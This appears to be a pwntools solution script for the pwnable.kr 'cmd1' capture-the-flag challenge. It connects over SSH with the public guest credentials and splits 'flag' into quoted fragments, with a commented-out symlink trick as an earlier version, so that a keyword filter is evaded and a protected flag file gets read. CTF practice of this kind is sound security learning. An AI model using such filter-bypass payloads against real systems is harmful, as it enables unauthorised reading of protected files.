from pwn import *

# obsolete solution
# payload = [
#     "mkdir /tmp/fuckyouverymuch",
#     "ln -s /home/cmd1/flag /tmp/fuckyouverymuch/fl@g",
#     "cd /tmp/fuckyouverymuch && /home/cmd1/cmd1 '/bin/cat fl@g'"
# ]
#
# for s in payload:
#     sh = con.run(s)
# print(sh.recvline())
con = ssh("cmd1", "pwnable.kr", 2222, "guest")
payload = '\'/bin/cat /home/cmd1/"fl""ag"\''
sh = con.run("/home/cmd1/cmd1 " + payload)
print(sh.recvline())

# mommy now I get what PATH environment is for :)
